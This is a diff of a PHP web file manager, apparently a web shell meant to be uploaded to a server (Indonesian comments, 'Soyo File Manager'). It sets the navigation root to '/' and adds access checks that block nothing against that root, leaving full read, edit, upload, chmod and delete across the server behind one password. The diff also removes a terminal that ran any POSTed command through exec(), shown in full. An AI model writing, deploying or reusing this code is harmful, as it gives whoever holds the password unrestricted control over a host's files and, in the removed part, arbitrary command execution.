@@ -7,16 +7,16 @@ $cdn_config = [
     'use_cdn' => true // Set false untuk menggunakan assets lokal
 ];
 
-// Configuration - Set root path to current directory where index.php is located
+// Enhanced Configuration with dual path system
 $config = [
-    'root_path' => realpath(__DIR__ . '/../../../../../../../../..'),
+    'upload_path' => __DIR__, // Lokasi default saat pertama akses (tempat file di-upload)
+    'root_path' => '/', // Batas atas navigasi (bisa akses sampai root sistem)
     'allowed_extensions' => ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'zip'],
     'max_upload_size' => 50 * 1024 * 1024, // 50MB
     'show_hidden' => false,
     'password_hash' => '$2y$10$Xx1c0aYemh5Xc4oV16j6SOJabT5Z3DBY.pm5CiORPGnk62Jof8NGq',
     'allow_root_access' => true
 ];
-
 
 // Helper function to get asset URL
 function getAssetUrl($path) {
@@ -34,6 +34,91 @@ function verifyPassword($password, $hash) {
 
 function generatePasswordHash($password) {
     return password_hash($password, PASSWORD_DEFAULT);
+}
+
+// ==================== ENHANCED PATH FUNCTIONS ====================
+function getCurrentPath() {
+    global $config;
+    
+    $requestedPath = $_GET['path'] ?? '';
+    
+    // Jika tidak ada path, gunakan upload_path sebagai default
+    if (empty($requestedPath)) {
+        return realpath($config['upload_path']);
+    }
+    
+    // PERBAIKAN: Deteksi jika path adalah sibling directory dari upload_path
+    $uploadPath = realpath($config['upload_path']);
+    $uploadParent = dirname($uploadPath);
+    
+    // Jika path dimulai dengan /, anggap sebagai absolute path
+    if (strpos($requestedPath, '/') === 0) {
+        $fullPath = realpath($requestedPath);
+    } else {
+        // PERBAIKAN: Cek apakah ini sibling directory
+        $possibleSibling = realpath($uploadParent . '/' . $requestedPath);
+        $possibleRelative = realpath($uploadPath . '/' . $requestedPath);
+        
+        // Prioritas: sibling directory dulu, baru relative path
+        if ($possibleSibling && is_dir($possibleSibling) && $possibleSibling !== $uploadPath) {
+            $fullPath = $possibleSibling;
+        } elseif ($possibleRelative && is_dir($possibleRelative)) {
+            $fullPath = $possibleRelative;
+        } else {
+            $fullPath = false;
+        }
+    }
+    
+    // Jika path tidak valid, fallback ke upload_path
+    if (!$fullPath || !is_dir($fullPath)) {
+        return realpath($config['upload_path']);
+    }
+    
+    // Security check: pastikan tidak keluar dari root_path
+    $rootPath = realpath($config['root_path']);
+    if (!startsWith($fullPath, $rootPath)) {
+        return realpath($config['upload_path']);
+    }
+    
+    return $fullPath;
+}
+
+function getRelativePath($fullPath) {
+    global $config;
+    
+    $uploadPath = realpath($config['upload_path']);
+    $uploadParent = dirname($uploadPath);
+    
+    // Jika path sama dengan upload_path, return empty
+    if ($fullPath === $uploadPath) {
+        return '';
+    }
+    
+    // PERBAIKAN: Jika path adalah sibling dari upload_path
+    if (dirname($fullPath) === $uploadParent && $fullPath !== $uploadPath) {
+        return basename($fullPath);
+    }
+    
+    // Jika path di dalam upload_path, return relative path
+    if (startsWith($fullPath, $uploadPath)) {
+        $relativePath = substr($fullPath, strlen($uploadPath));
+        return trim($relativePath, '/\\');
+    }
+    
+    // Jika path di luar upload_path, return absolute path
+    return $fullPath;
+}
+
+function canAccessPath($path) {
+    global $config;
+    
+    $realPath = realpath($path);
+    if (!$realPath) {
+        return false;
+    }
+    
+    $rootPath = realpath($config['root_path']);
+    return startsWith($realPath, $rootPath);
 }
 
 // ==================== UTILITY FUNCTIONS ====================
@@ -222,119 +307,75 @@ function recurseCopy($src, $dst) {
     return true;
 }
 
-function generateBreadcrumb($currentPath, $rootPath) {
+function generateBreadcrumb($currentPath) {
     global $config;
     
-    $breadcrumb = '<a href="?">🏠 Home</a>';
+    $uploadPath = realpath($config['upload_path']);
+    $rootPath = realpath($config['root_path']);
     
-    $currentPath = realpath($currentPath) ?: $currentPath;
+    $breadcrumb = '<a href="?">🏠 Home (' . basename($uploadPath) . ')</a>';
     
-    $pathParts = explode('/', trim($currentPath, '/'));
-    $pathParts = array_filter($pathParts, function($part) {
-        return !empty($part);
-    });
+    // Jika current path sama dengan upload path, return home saja
+    if ($currentPath === $uploadPath) {
+        $breadcrumb .= '<div style="margin-top: 8px; font-size: 11px; color: #a0a0b0; font-family: monospace;">';
+        $breadcrumb .= '📍 Current: ' . htmlspecialchars($currentPath);
+        $breadcrumb .= '</div>';
+        return $breadcrumb;
+    }
     
-    $buildPath = '';
-    foreach ($pathParts as $index => $part) {
-        $buildPath .= '/' . $part;
+    // Jika di dalam upload path
+    if (startsWith($currentPath, $uploadPath)) {
+        $relativePath = substr($currentPath, strlen($uploadPath));
+        $pathParts = explode('/', trim($relativePath, '/'));
+        $pathParts = array_filter($pathParts);
         
-        $navigationPath = $buildPath;
-        $encodedPath = urlencode($navigationPath);
+        $buildPath = '';
+        foreach ($pathParts as $part) {
+            $buildPath .= '/' . $part;
+            $encodedPath = urlencode(trim($buildPath, '/'));
+            $breadcrumb .= ' / <a href="?path=' . $encodedPath . '">' . htmlspecialchars($part) . '</a>';
+        }
+    } else {
+        // Jika di luar upload path, tampilkan absolute path
+        $pathParts = explode('/', trim($currentPath, '/'));
+        $pathParts = array_filter($pathParts);
         
-        $breadcrumb .= ' / <a href="?path=' . $encodedPath . '">' . htmlspecialchars($part) . '</a>';
+        $buildPath = '';
+        foreach ($pathParts as $part) {
+            $buildPath .= '/' . $part;
+            $encodedPath = urlencode($buildPath);
+            $breadcrumb .= ' / <a href="?path=' . $encodedPath . '">' . htmlspecialchars($part) . '</a>';
+        }
     }
     
     $breadcrumb .= '<div style="margin-top: 8px; font-size: 11px; color: #a0a0b0; font-family: monospace;">';
-    $breadcrumb .= '📍 Full Path: ' . htmlspecialchars($currentPath);
+    $breadcrumb .= '📍 Current: ' . htmlspecialchars($currentPath);
+    $breadcrumb .= '<br>🏠 Upload Base: ' . htmlspecialchars($uploadPath);
     $breadcrumb .= '</div>';
     
     return $breadcrumb;
 }
 
-function getFolderList() {
-    global $config;
-    
-    $searchPath = $_GET['search_path'] ?? '';
-    $folders = [];
-    
-    if (empty($searchPath)) {
-        $searchPath = '/';
-    } else {
-        if (strpos($searchPath, '/') !== 0) {
-            $searchPath = $config['root_path'] . '/' . $searchPath;
-        }
-    }
-    
-    try {
-        $commonDirs = [
-            '/' => 'Root Directory',
-            '/home' => 'Home Directory',
-            '/var' => 'Var Directory',
-            '/tmp' => 'Temp Directory',
-            $config['root_path'] => 'Current Root'
-        ];
-        
-        foreach ($commonDirs as $path => $name) {
-            if (is_dir($path) && is_readable($path)) {
-                $folders[] = [
-                    'path' => $path,
-                    'name' => $name,
-                    'full_path' => $path
-                ];
-            }
-        }
-        
-        if (is_dir($searchPath) && is_readable($searchPath)) {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($searchPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::SELF_FIRST
-            );
-            
-            $count = 0;
-            foreach ($iterator as $file) {
-                if ($count++ > 50) break;
-                
-                if ($file->isDir()) {
-                    $fullPath = $file->getPathname();
-                    $relativePath = str_replace($config['root_path'], '', $fullPath);
-                    $relativePath = trim($relativePath, '/\\');
-                    
-                    $folders[] = [
-                        'path' => $fullPath,
-                        'name' => basename($fullPath),
-                        'full_path' => $fullPath
-                    ];
-                }
-            }
-        }
-        
-    } catch (Exception $e) {
-        $folders = [
-            [
-                'path' => '/',
-                'name' => 'Root Directory',
-                'full_path' => '/'
-            ],
-            [
-                'path' => $config['root_path'],
-                'name' => 'Current Root',
-                'full_path' => $config['root_path']
-            ]
-        ];
-    }
-    
-    header('Content-Type: application/json');
-    echo json_encode($folders);
-}
-
 // ==================== FILE OPERATIONS ====================
 function viewFile($filePath) {
+    if (!canAccessPath($filePath) || !file_exists($filePath)) {
+        http_response_code(404);
+        echo "File not found or access denied.";
+        return;
+    }
+    
     $mimeType = mime_content_type($filePath);
     header('Content-Type: ' . $mimeType);
     readfile($filePath);
 }
 
 function downloadFile($filePath) {
+    if (!canAccessPath($filePath) || !file_exists($filePath)) {
+        http_response_code(404);
+        echo "File not found or access denied.";
+        return;
+    }
+    
     header('Content-Description: File Transfer');
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
@@ -346,8 +387,15 @@ function downloadFile($filePath) {
 }
 
 function deleteFile($filePath) {
+    if (!canAccessPath($filePath) || !file_exists($filePath)) {
+        echo "File not found or access denied.";
+        return;
+    }
+    
     if (unlink($filePath)) {
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
+        $currentPath = getCurrentPath();
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error deleting file.";
     }
@@ -356,8 +404,8 @@ function deleteFile($filePath) {
 function uploadFiles($targetDirectory) {
     global $config;
     
-    if (!is_dir($targetDirectory) || !is_writable($targetDirectory)) {
-        echo "Target directory is not writable.";
+    if (!canAccessPath($targetDirectory) || !is_dir($targetDirectory) || !is_writable($targetDirectory)) {
+        echo "Target directory is not writable or access denied.";
         return;
     }
     
@@ -390,7 +438,9 @@ function uploadFiles($targetDirectory) {
         }
     }
     
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+    $currentPath = getCurrentPath();
+    $relativePath = getRelativePath($currentPath);
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
 }
 
 function createFolder($targetDirectory, $folderName) {
@@ -399,10 +449,17 @@ function createFolder($targetDirectory, $folderName) {
         return;
     }
     
+    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
+        echo "Access denied or directory not writable.";
+        return;
+    }
+    
     $newFolderPath = $targetDirectory . '/' . $folderName;
     
     if (mkdir($newFolderPath)) {
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+        $currentPath = getCurrentPath();
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error creating folder.";
     }
@@ -414,6 +471,11 @@ function createFile($targetDirectory, $fileName, $fileContent = '') {
         return;
     }
     
+    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
+        echo "Access denied or directory not writable.";
+        return;
+    }
+    
     $newFilePath = $targetDirectory . '/' . $fileName;
     
     if (file_exists($newFilePath)) {
@@ -422,26 +484,42 @@ function createFile($targetDirectory, $fileName, $fileContent = '') {
     }
     
     if (file_put_contents($newFilePath, $fileContent) !== false) {
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+        $currentPath = getCurrentPath();
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error creating file.";
     }
 }
 
 function saveFile($filePath, $content) {
+    if (!canAccessPath($filePath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     if (file_put_contents($filePath, $content) !== false) {
         echo "File saved successfully!";
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
+        $currentPath = dirname($filePath);
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error saving file.";
     }
 }
 
 function changePermissions($filePath, $permissions) {
+    if (!canAccessPath($filePath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     $permissions = octdec($permissions);
     if (chmod($filePath, $permissions)) {
         echo "Permissions changed successfully!";
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
+        $currentPath = dirname($filePath);
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error changing permissions.";
     }
@@ -450,6 +528,11 @@ function changePermissions($filePath, $permissions) {
 function compressFiles($targetDirectory, $files, $archiveName) {
     if (empty($files)) {
         echo "No files selected for compression.";
+        return;
+    }
+    
+    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
+        echo "Access denied or directory not writable.";
         return;
     }
     
@@ -473,7 +556,9 @@ function compressFiles($targetDirectory, $files, $archiveName) {
         }
         
         $zip->close();
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+        $currentPath = getCurrentPath();
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error creating zip archive.";
     }
@@ -498,29 +583,48 @@ function addDirectoryToZip($zip, $dirPath, $localPath) {
 }
 
 function extractFile($filePath) {
+    if (!canAccessPath($filePath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     $zip = new ZipArchive();
     
     if ($zip->open($filePath) === TRUE) {
         $extractPath = dirname($filePath);
         $zip->extractTo($extractPath);
         $zip->close();
-        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+        $currentPath = getCurrentPath();
+        $relativePath = getRelativePath($currentPath);
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
     } else {
         echo "Error opening zip archive.";
     }
 }
 
 function copyToClipboard($filePath) {
+    if (!canAccessPath($filePath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     $_SESSION['clipboard'] = [
         'path' => $filePath,
         'type' => is_dir($filePath) ? 'directory' : 'file'
     ];
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
+    $currentPath = getCurrentPath();
+    $relativePath = getRelativePath($currentPath);
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
 }
 
 function pasteFromClipboard($targetDirectory) {
     if (!isset($_SESSION['clipboard'])) {
         echo "Clipboard is empty.";
+        return;
+    }
+    
+    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
+        echo "Access denied or directory not writable.";
         return;
     }
     
@@ -535,31 +639,21 @@ function pasteFromClipboard($targetDirectory) {
     
     if (is_dir($sourcePath)) {
         if (recurseCopy($sourcePath, $destinationPath)) {
-            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+            $currentPath = getCurrentPath();
+            $relativePath = getRelativePath($currentPath);
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
         } else {
             echo "Error copying directory.";
         }
     } else {
         if (copy($sourcePath, $destinationPath)) {
-            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+            $currentPath = getCurrentPath();
+            $relativePath = getRelativePath($currentPath);
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
         } else {
             echo "Error copying file.";
         }
     }
-}
-
-function runTerminalCommand($currentDirectory) {
-    session_start();
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
-        $cmd = trim($_POST['cmd']);
-        $output = [];
-        $returnVar = 0;
-        chdir($currentDirectory);
-        exec($cmd . " 2>&1", $output, $returnVar);
-        $_SESSION['terminal_output'] = implode("\n", $output);
-    }
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path'] ?? '') . '#terminal');
-    exit;
 }
 
 function bulkDeleteFiles($files, $currentPath) {
@@ -568,10 +662,15 @@ function bulkDeleteFiles($files, $currentPath) {
         return;
     }
     
+    if (!canAccessPath($currentPath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     $deletedCount = 0;
     foreach ($files as $file) {
         $filePath = $currentPath . '/' . $file;
-        if (file_exists($filePath)) {
+        if (file_exists($filePath) && canAccessPath($filePath)) {
             if (is_dir($filePath)) {
                 if (deleteDirectory($filePath)) {
                     $deletedCount++;
@@ -585,7 +684,8 @@ function bulkDeleteFiles($files, $currentPath) {
     }
     
     $_SESSION['message'] = "Successfully deleted $deletedCount items.";
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+    $relativePath = getRelativePath($currentPath);
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
 }
 
 function bulkCopyFiles($files, $currentPath) {
@@ -594,10 +694,15 @@ function bulkCopyFiles($files, $currentPath) {
         return;
     }
     
+    if (!canAccessPath($currentPath)) {
+        echo "Access denied.";
+        return;
+    }
+    
     $_SESSION['bulk_clipboard'] = [];
     foreach ($files as $file) {
         $filePath = $currentPath . '/' . $file;
-        if (file_exists($filePath)) {
+        if (file_exists($filePath) && canAccessPath($filePath)) {
             $_SESSION['bulk_clipboard'][] = [
                 'path' => $filePath,
                 'type' => is_dir($filePath) ? 'directory' : 'file',
@@ -607,7 +712,8 @@ function bulkCopyFiles($files, $currentPath) {
     }
     
     $_SESSION['message'] = "Copied " . count($_SESSION['bulk_clipboard']) . " items to clipboard.";
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
+    $relativePath = getRelativePath($currentPath);
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relativePath));
 }
 
 function deleteDirectory($dir) {
@@ -628,253 +734,7 @@ function deleteDirectory($dir) {
     return rmdir($dir);
 }
 
-// ==================== SEARCH FUNCTIONS ====================
-function performFileSearch($rootPath, $filenameQuery, $contentQuery, $filenameType = 'contain', $contentType = 'contain') {
-    $results = [];
-    $searchCount = 0;
-    $maxResults = 1000;
-    
-    $searchFolder = $_GET['search_folder'] ?? '';
-    
-    if (!empty($searchFolder)) {
-        if ($searchFolder === '/') {
-            $searchPath = '/';
-        } elseif (strpos($searchFolder, '/') === 0) {
-            $searchPath = $searchFolder;
-        } else {
-            $searchPath = $rootPath . '/' . $searchFolder;
-        }
-    } else {
-        $searchPath = $rootPath;
-    }
-    
-    if (!is_dir($searchPath) || !is_readable($searchPath)) {
-        throw new Exception("Search path is not accessible: " . $searchPath);
-    }
-    
-    try {
-        $iterator = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($searchPath, RecursiveDirectoryIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::LEAVES_ONLY
-        );
-        
-        foreach ($iterator as $file) {
-            if ($searchCount++ > $maxResults) {
-                break;
-            }
-            
-            if (!$file->isFile()) continue;
-            
-            $filename = $file->getFilename();
-            $fullPath = $file->getPathname();
-            
-            $relativePath = str_replace($rootPath . DIRECTORY_SEPARATOR, '', $fullPath);
-            $relativePath = str_replace(DIRECTORY_SEPARATOR, '/', $relativePath);
-            
-            $filenameMatch = false;
-            $contentMatch = false;
-            
-            if (!empty($filenameQuery)) {
-                $filenameMatch = matchFilename($filename, $filenameQuery, $filenameType);
-            }
-            
-            if (!empty($contentQuery) && isTextFile($filename)) {
-                try {
-                    if ($file->getSize() < 10 * 1024 * 1024) {
-                        $content = file_get_contents($fullPath);
-                        if ($content !== false) {
-                            $contentMatch = matchContent($content, $contentQuery, $contentType);
-                        }
-                    }
-                } catch (Exception $e) {
-                    continue;
-                }
-            }
-            
-            $shouldInclude = false;
-            $matchType = '';
-            
-            if (!empty($filenameQuery) && !empty($contentQuery)) {
-                if ($filenameMatch && $contentMatch) {
-                    $shouldInclude = true;
-                    $matchType = 'both';
-                }
-            } elseif (!empty($filenameQuery)) {
-                if ($filenameMatch) {
-                    $shouldInclude = true;
-                    $matchType = 'filename';
-                }
-            } elseif (!empty($contentQuery)) {
-                if ($contentMatch) {
-                    $shouldInclude = true;
-                    $matchType = 'content';
-                }
-            }
-            
-            if ($shouldInclude) {
-                $results[] = [
-                    'filename' => $filename,
-                    'full_path' => $fullPath,
-                    'relative_path' => $relativePath,
-                    'directory' => dirname($relativePath),
-                    'size' => formatBytes($file->getSize()),
-                    'icon' => getFileIcon($filename, false),
-                    'is_editable' => isEditable($filename),
-                    'match_type' => $matchType
-                ];
-            }
-        }
-    } catch (Exception $e) {
-        throw new Exception("Search failed: " . $e->getMessage());
-    }
-    
-    return $results;
-}
-
-function matchFilename($filename, $query, $type) {
-    switch ($type) {
-        case 'equal':
-            return strcasecmp($filename, $query) === 0;
-        case 'start':
-            return stripos($filename, $query) === 0;
-        case 'end':
-            return substr_compare($filename, $query, -strlen($query), strlen($query), true) === 0;
-        case 'wildcard':
-            $pattern = str_replace(['*', '?'], ['.*', '.'], preg_quote($query, '/'));
-            return preg_match('/^' . $pattern . '$/i', $filename);
-        case 'contain':
-        default:
-            return stripos($filename, $query) !== false;
-    }
-}
-
-function matchContent($content, $query, $type) {
-    switch ($type) {
-        case 'equal':
-            return strcasecmp(trim($content), trim($query)) === 0;
-        case 'start':
-            return stripos($content, $query) === 0;
-        case 'end':
-            return substr_compare($content, $query, -strlen($query), strlen($query), true) === 0;
-        case 'wildcard':
-            $pattern = str_replace(['*', '?'], ['.*', '.'], preg_quote($query, '/'));
-            return preg_match('/' . $pattern . '/i', $content);
-        case 'contain':
-        default:
-            return stripos($content, $query) !== false;
-    }
-}
-
-function bulkDeleteSearchResults($files) {
-    if (empty($files)) {
-        echo "No files selected for deletion.";
-        return;
-    }
-    
-    foreach ($files as $file) {
-        $filePath = realpath(__DIR__ . '/' . $file);
-        if (file_exists($filePath)) {
-            unlink($filePath);
-        }
-    }
-    
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?action=search&filename=' . urlencode($_GET['filename'] ?? '') . '&content=' . urlencode($_GET['content'] ?? ''));
-}
-
-function debugSearch() {
-    global $config;
-    
-    $filenameQuery = $_GET['filename'] ?? '';
-    $contentQuery = $_GET['content'] ?? '';
-    $filenameType = $_GET['filename_type'] ?? 'contain';
-    $contentType = $_GET['content_type'] ?? 'contain';
-    
-    echo '<!DOCTYPE html>
-    <html>
-    <head>
-        <title>Search Debug - Soyo File Manager</title>
-        <style>
-            body {
-                font-family: sans-serif;
-                background-color: #f4f4f4;
-                color: #333;
-                padding: 20px;
-            }
-            .debug-section {
-                background-color: #fff;
-                border: 1px solid #ddd;
-                padding: 15px;
-                margin-bottom: 20px;
-                border-radius: 4px;
-            }
-            .debug-section h3 {
-                margin-top: 0;
-                color: #555;
-            }
-            .debug-info {
-                margin-bottom: 10px;
-            }
-            .debug-info strong {
-                font-weight: bold;
-            }
-            code {
-                background-color: #eee;
-                padding: 2px 5px;
-                border-radius: 3px;
-            }
-            .error {
-                color: red;
-            }
-        </style>
-    </head>
-    <body>
-        <h1>Search Debug Information</h1>';
-    
-    echo '<div class="debug-section">
-        <h3>Search Parameters</h3>
-        <div class="debug-info">
-            <strong>Filename Query:</strong> ' . ($filenameQuery ? '<code>' . htmlspecialchars($filenameQuery) . '</code> (' . $filenameType . ')' : '<em>Not specified</em>') . '<br>
-            <strong>Content Query:</strong> ' . ($contentQuery ? '<code>' . htmlspecialchars($contentQuery) . '</code> (' . $contentType . ')' : '<em>Not specified</em>') . '
-        </div>
-    </div>';
-    
-    echo '<div class="debug-section">
-        <h3>Configuration</h3>
-        <div class="debug-info">
-            <strong>Root Path:</strong> <code>' . htmlspecialchars($config['root_path']) . '</code><br>
-            <strong>Allowed Extensions:</strong> <code>' . implode(', ', $config['allowed_extensions']) . '</code><br>
-            <strong>Max Upload Size:</strong> <code>' . $config['max_upload_size'] . '</code><br>
-            <strong>Show Hidden Files:</strong> <code>' . ($config['show_hidden'] ? 'true' : 'false') . '</code>
-        </div>
-    </div>';
-    
-    echo '<div class="debug-section">
-        <h3>Test Search</h3>';
-    
-    try {
-        $testResults = performFileSearch($config['root_path'], $filenameQuery, $contentQuery, $filenameType, $contentType);
-        
-        echo '<div class="debug-info">
-                <strong>Search Performed Successfully!</strong><br>
-                <strong>Results Found:</strong> ' . count($testResults) . '
-              </div>';
-        
-        if (!empty($testResults)) {
-            echo '<h4>First 5 Results:</h4><ul>';
-            for ($i = 0; $i < min(5, count($testResults)); $i++) {
-                echo '<li><code>' . htmlspecialchars($testResults[$i]['relative_path']) . '</code></li>';
-            }
-            echo '</ul>';
-        }
-    } catch (Exception $e) {
-        echo '<div class="debug-info error">
-                <strong>Search Failed:</strong> ' . htmlspecialchars($e->getMessage()) . '
-              </div>';
-    }
-    
-    echo '</div>';
-    echo '</body></html>';
-}
+// ==================== ENHANCED SEARCH FUNCTIONS ====================
 
 // ==================== TEMPLATE FUNCTIONS ====================
 function showLoginForm() {
@@ -972,10 +832,19 @@ function showLoginForm() {
 
 function showFileManager($currentPath, $relativePath) {
     global $config;
-    $files = scandir($currentPath);
-    $files = array_filter($files, function($file) use ($config) {
-        return $file !== '.' && ($config['show_hidden'] || $file[0] !== '.');
-    });
+    
+    if (!canAccessPath($currentPath)) {
+        echo "<h1>Access Denied</h1><p>You don't have permission to access this directory.</p>";
+        return;
+    }
+    
+    $files = [];
+    if (is_readable($currentPath)) {
+        $files = scandir($currentPath);
+        $files = array_filter($files, function($file) use ($config) {
+            return $file !== '.' && ($config['show_hidden'] || $file[0] !== '.');
+        });
+    }
     
     $sortBy = $_GET['sort'] ?? 'name';
     $sortOrder = $_GET['order'] ?? 'asc';
@@ -999,7 +868,7 @@ function showFileManager($currentPath, $relativePath) {
         </div>
         
         <div class="breadcrumb">
-            <?php echo generateBreadcrumb($currentPath, $config['root_path']); ?>
+            <?php echo generateBreadcrumb($currentPath); ?>
         </div>
         
         <div class="toolbar">
@@ -1007,86 +876,8 @@ function showFileManager($currentPath, $relativePath) {
             <button onclick="toggleFolder()">📁 Create Folder</button>
             <button onclick="toggleCreateFile()">📄 Create File</button>
             <button onclick="toggleCompress()" class="compress">📦 Compress Selected</button>
-            <button onclick="toggleSearch()" class="search">🔍 Search Files</button>
-            <button onclick="toggleTerminal()" style="background:linear-gradient(135deg,#111827 0%,#374151 100%);color:white;">🖥️ Terminal</button>
         </div>
 
-        <!-- Enhanced Terminal Form -->
-        <div id="terminal-form" class="terminal-form hidden">
-            <form method="post" action="?action=terminal&path=<?php echo urlencode($relativePath); ?>">
-                <label>Linux Command Terminal</label>
-                <input type="text" name="cmd" placeholder="ls -lah">
-                <div class="terminal-buttons">
-                    <input type="submit" value="Run" class="run-btn">
-                    <button type="button" onclick="toggleTerminal()" class="cancel-btn">Cancel</button>
-                </div>
-            </form>
-            <?php if (isset($_SESSION['terminal_output'])): ?>
-                <div class="terminal-output"><?php echo htmlspecialchars($_SESSION['terminal_output']); ?></div>
-            <?php unset($_SESSION['terminal_output']); ?>
-            <?php endif; ?>
-        </div>
-        
-        <!-- Enhanced Search Form -->
-        <div id="search-form" class="search-form-enhanced hidden">
-            <div class="search-form-grid">
-                <div class="search-group">
-                    <label>Search by Filename:</label>
-                    <div class="search-input-group">
-                        <select id="filename-type" class="search-select">
-                            <option value="contain">Contains</option>
-                            <option value="start">Starts with</option>
-                            <option value="end">Ends with</option>
-                            <option value="equal">Exact match</option>
-                            <option value="wildcard">Wildcard (*?)</option>
-                        </select>
-                        <input type="text" id="filename-search" placeholder="e.g., *.php, config, index.html" />
-                    </div>
-                </div>
-                <div class="search-group">
-                    <label>Search by Content:</label>
-                    <div class="search-input-group">
-                        <select id="content-type" class="search-select">
-                            <option value="contain">Contains</option>
-                            <option value="start">Starts with</option>
-                            <option value="end">Ends with</option>
-                            <option value="equal">Exact match</option>
-                            <option value="wildcard">Wildcard (*?)</option>
-                        </select>
-                        <input type="text" id="content-search" placeholder="e.g., function, &lt;?php, TODO" />
-                    </div>
-                </div>
-                <div class="folder-selection">
-                    <label>Search in Folder:</label>
-                    <div class="folder-input-group">
-                        <input type="hidden" id="search-folder" value="">
-                        <input type="text" id="search-folder-display" placeholder="Current Directory" readonly>
-                        <button type="button" class="folder-browse-btn" onclick="showFolderBrowser()">📁 Browse</button>
-                    </div>
-                </div>
-            </div>
-            <div class="search-buttons">
-                <button type="button" class="search-btn" onclick="performSearch()">🔍 Search</button>
-                <button type="button" class="cancel-search-btn" onclick="toggleSearch()">Cancel</button>
-            </div>
-        </div>
-        
-        <!-- Folder Browser Modal -->
-        <div id="folder-browser-modal" class="folder-browser-modal">
-            <div class="folder-browser-content">
-                <div class="folder-browser-header">
-                    <h3>📁 Select Search Folder</h3>
-                    <button class="folder-browser-close" onclick="hideFolderBrowser()">✕</button>
-                </div>
-                <div id="folder-list" class="folder-list">
-                    <!-- Folders will be loaded here -->
-                </div>
-                <div class="folder-browser-footer">
-                    <button class="select-folder-btn" onclick="confirmFolderSelection()">Select Folder</button>
-                    <button class="cancel-folder-btn" onclick="hideFolderBrowser()">Cancel</button>
-                </div>
-            </div>
-        </div>
         
         <div id="upload-form" class="upload-form hidden">
             <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($relativePath); ?>">
@@ -1181,17 +972,8 @@ function showFileManager($currentPath, $relativePath) {
             
             <?php 
             $parentPath = dirname($currentPath);
-            if ($parentPath !== $currentPath && $parentPath !== '.' && $parentPath !== $currentPath): 
-                if (strpos($currentPath, '/') === 0) {
-                    $relativeParentPath = $parentPath;
-                } else {
-                    if (strpos($parentPath, $config['root_path']) === 0) {
-                        $relativeParentPath = str_replace($config['root_path'], '', $parentPath);
-                        $relativeParentPath = trim($relativeParentPath, '/\\');
-                    } else {
-                        $relativeParentPath = $parentPath;
-                    }
-                }
+            if ($parentPath !== $currentPath && $parentPath !== '.' && canAccessPath($parentPath)): 
+                $relativeParentPath = getRelativePath($parentPath);
             ?>
             <div class="file-item folder">
                 <div class="file-checkbox"></div>
@@ -1229,7 +1011,7 @@ function showFileManager($currentPath, $relativePath) {
                 }
                 
                 $fileIcon = getFileIcon($file, $isDir);
-                $fileRelativePath = $relativePath ? $relativePath . '/' . $file : $file;
+                $fileRelativePath = getRelativePath($fullFilePath);
